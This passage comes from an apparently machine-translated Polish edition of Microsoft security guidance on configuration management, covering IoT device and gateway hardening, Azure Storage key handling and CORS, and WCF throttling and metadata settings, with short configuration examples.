| **Kroki** | Pliki konfiguracji, takich jak plik Web.config, appsettings.json są często używane do przechowywania informacji poufnych, w tym nazwy użytkownika, hasła, parametry połączenia bazy danych i kluczy szyfrowania. Jeśli nie będzie chronić te informacje, aplikacja jest narażony na ataki lub złośliwym użytkownikom uzyskania poufne informacje, takie jak nazwy kont i hasła, nazwy bazy danych i nazwy serwera. Oparty na typie wdrożenia (azure/lokalnego), szyfrowanie sekcji poufnych plików konfiguracji przy użyciu DPAPI lub usługi, takie jak usługi Azure Key Vault. |

## <a id="admin-strong"></a>Upewnij się, że wszystkich interfejsów administracyjnych są zabezpieczony z silnych poświadczeń

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Wszelkie administracyjne interfejsów, które udostępnia bramy urządzenia lub pola powinna być chronione przy użyciu silnych poświadczeń. Ponadto innych interfejsów, takich jak Wi-Fi, SSH, udziałów plików, FTP, powinny być zabezpieczone przy użyciu poświadczeń silne. Nie należy używać domyślnej słabe hasła. |

## <a id="unknown-exe"></a>Upewnij się, że nieznany kod nie można wykonać na urządzeniach

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Włączanie bezpiecznego rozruchu i skrytki bitowego szyfrowania urządzenia w systemie Windows 10 IoT Core](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **Kroki** | Bezpiecznego rozruchu UEFI ogranicza tylko umożliwia wykonanie podpisane przez określony urząd plików binarnych systemu. Ta funkcja zapobiega nieznany kod wykonywany na platformie i potencjalnie osłabienia stan zabezpieczeń go. Włączanie bezpiecznego rozruchu UEFI i ograniczenia dotyczące listy urzędów certyfikacji, które są zaufane do podpisywania kodu. Zaloguj się całego kodu, który jest wdrożony na urządzeniu przy użyciu jednej z zaufanych urzędów. |

## <a id="partition-iot"></a>Szyfrowanie systemu operacyjnego i dodatkowe partycje urządzenia IoT z bitowego skrytki

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Windows 10 IoT Core implementuje to Uproszczona wersja skrytki bitowe szyfrowanie urządzeń, która ma silne zależności na obecność modułu TPM na platformie, łącznie z protokołem preOS niezbędne w oprogramowaniu układowym UEFI, który prowadzi niezbędnych pomiarów. Pomiarów preOS upewnij się, że system operacyjny później zawiera ostateczne rekord jak został uruchomiony system operacyjny. Szyfrowanie partycji systemu operacyjnego przy użyciu bitowego skrytki i wszelkie dodatkowe partycje, również w przypadku, gdy ich przechowywania poufnych danych. |

## <a id="min-enable"></a>Upewnij się, że tylko minimalne usług/funkcji, które są włączone na urządzeniach

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Nie włączaj ani wyłączyć wszystkie funkcje lub usług w systemie operacyjnym, które nie są wymagane do funkcjonowania rozwiązania. Na przykład jeśli urządzenie nie wymaga interfejsu użytkownika do wdrożenia, zainstalowania systemu Windows IoT Core w trybie bezobsługowe. |

## <a id="field-bit-locker"></a>Szyfrowanie systemu operacyjnego i dodatkowe partycje IoT pola bramy z bitowego skrytki

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Pole IoT bramy | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Windows 10 IoT Core implementuje to Uproszczona wersja skrytki bitowe szyfrowanie urządzeń, która ma silne zależności na obecność modułu TPM na platformie, łącznie z protokołem preOS niezbędne w oprogramowaniu układowym UEFI, który prowadzi niezbędnych pomiarów. Pomiarów preOS upewnij się, że system operacyjny później zawiera ostateczne rekord jak został uruchomiony system operacyjny. Szyfrowanie partycji systemu operacyjnego przy użyciu bitowego skrytki i wszelkie dodatkowe partycje, również w przypadku, gdy ich przechowywania poufnych danych. |

## <a id="default-change"></a>Upewnij się, że poświadczenia logowania domyślnej bramy pola są zmieniane podczas instalacji

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Pole IoT bramy | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Upewnij się, że poświadczenia logowania domyślnej bramy pola są zmieniane podczas instalacji |

## <a id="cloud-firmware"></a>Upewnij się, że brama chmury implementuje procesu aktualności oprogramowania układowego połączonych urządzeń

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Brama chmury IoT | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | Wybór bramy - Centrum IoT Azure |
| **Odwołania**              | [Omówienie zarządzania urządzeniami Centrum IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [aktualizacji oprogramowania układowego urządzenia](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Kroki** | LWM2M jest protokołem z otwartych Alliance Mobile do zarządzania urządzeniami IoT. Zarządzanie urządzeniami w usłudze Azure IoT umożliwia interakcję z urządzeń fizycznych przy użyciu zadań urządzenia. Upewnij się, że brama chmury implementuje procesu rutynowo chronić urządzenia i inne dane konfiguracyjne aktualności przy użyciu zarządzania urządzeniami Centrum IoT Azure. |

## <a id="controls-policies"></a>Upewnij się, że urządzenia mają skonfigurowane zgodnie z zasadami organizacji kontroli zabezpieczeń punktu końcowego

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Granic zaufania maszyny | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Upewnij się, czy urządzenia mają formanty zabezpieczeń punktu końcowego, takie jak skrytka na bit do szyfrowania na poziomie dysku, oprogramowanie antywirusowe zaktualizowane podpisów, zapory oparte na, uaktualnień systemu operacyjnego hosta, grupy zasad są skonfigurowane itp., zgodnie z zasadami zabezpieczeń organizacji. |

## <a id="secure-keys"></a>Zapewnienia bezpiecznego zarządzania kluczami dostępu do magazynu Azure

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Azure Storage | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Przewodnik zabezpieczeń magazynu Azure — Zarządzanie Twoje klucze konta magazynu](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Kroki** | <p>Magazynu kluczy: Zalecane jest przechowywanie kluczy dostępu do magazynu Azure w usłudze Azure Key Vault jako klucz tajny i aplikacjami, pobrać klucza z magazynu kluczy. Jest to zalecane z następujących powodów:</p><ul><li>Aplikacja nigdy nie będą miały ustalony klucza magazynu w pliku konfiguracji, co spowoduje usunięcie tej osoby uzyskiwanie dostępu do kluczy bez wyraźnej zgody ścieżek</li><li>Dostęp do kluczy można sterować za pomocą usługi Azure Active Directory. Oznacza to, że właściciel konta mogą udzielać dostępu do grupy aplikacji, które muszą pobrać klucze z usługi Azure Key Vault. Inne aplikacje nie będą mogli uzyskać dostęp do kluczy bez przyznania im uprawnień w szczególności</li><li>Ponowne generowanie klucza: Zalecane jest mają zaimplementowany proces w miejscu, można ponownie wygenerować klucze dostępu do magazynu Azure ze względów bezpieczeństwa. Szczegółowe informacje o tym, dlaczego i sposób planowania ponowne generowanie klucza opisano w artykule przewodnik zabezpieczeń magazynu Azure</li></ul>|

## <a id="cors-storage"></a>Zapewni, że tylko zaufane źródeł włączenie mechanizmu CORS w magazynie Azure

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Azure Storage | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Obsługa mechanizmu CORS dla usług Azure Storage](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Kroki** | Magazyn Azure umożliwia CORS — Cross udostępniania zasobów pochodzenia. Dla każdego konta magazynu można określić domeny, które mogą uzyskiwać dostęp do zasobów na tym koncie magazynu. Domyślnie CORS jest wyłączona na wszystkich usług. Mechanizm CORS można włączyć za pomocą interfejsu API REST lub biblioteka klienta magazynu do wywoływania jednej z metod, aby ustawić zasady usługi. |

## <a id="throttling"></a>Włącz usługę WCF dla funkcji ograniczania

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | WCF | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | .NET framework 3 |
| **Atrybuty**              | ND  |
| **Odwołania**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [uzyskania zawartości Królestwo](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Kroki** | <p>Nie obrotu ograniczenie użycia zasobów systemowych, może spowodować wyczerpanie zasobów, a ostatecznie jest przesyłany do odmowy usługi.</p><ul><li>**Wyjaśnienie:** Windows Communication Foundation (WCF) umożliwia ograniczenie przepustowości żądania obsługi. Stosowanie zbyt wiele żądań klientów można wypełniania systemu i spalin jego zasoby. Z drugiej strony dzięki czemu tylko niewielką liczbę żądań do usługi uniemożliwi autoryzowanych użytkowników przy użyciu usługi. Każda usługa należy indywidualnie dostosowana do i skonfigurowane i umożliwiają odpowiednią ilość zasobów.</li><li>**Zalecenia dotyczące** funkcji ograniczania przepustowości usługi i ustawianie limitów włączyć WCF odpowiednie dla twojej aplikacji.</li></ul>|

### <a name="example"></a>Przykład
Poniżej przedstawiono przykładową konfigurację po zastosowaniu ograniczania włączone:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Ujawnienie informacji WCF za pomocą metadanych

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | WCF | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | .NET framework 3 |
| **Atrybuty**              | ND  |
| **Odwołania**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [uzyskania zawartości Królestwo](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Kroki** | Metadane mogą pomóc osoby atakujące plan forma ataku i Dowiedz się więcej o systemie. Usługi WCF można skonfigurować do udostępnienia metadanych. Metadane udostępnia usługi szczegółowy opis informacji i nie powinien być emisji w środowiskach produkcyjnych. `HttpGetEnabled`  /  `HttpsGetEnabled` Właściwości klasy ServiceMetaData definiuje, czy usługa uwidoczni metadanych | 

### <a name="example"></a>Przykład
Poniższy kod nakazuje WCF do emitowania metadanych usługi
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Emituje metadanych usługi w środowisku produkcyjnym. Ustaw HttpGetEnabled / HttpsGetEnabled właściwości ServiceMetaData klas na wartość false. 

### <a name="example"></a>Przykład
Poniższy kod powoduje, że usługi WCF nie emisji metadanych usługi. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
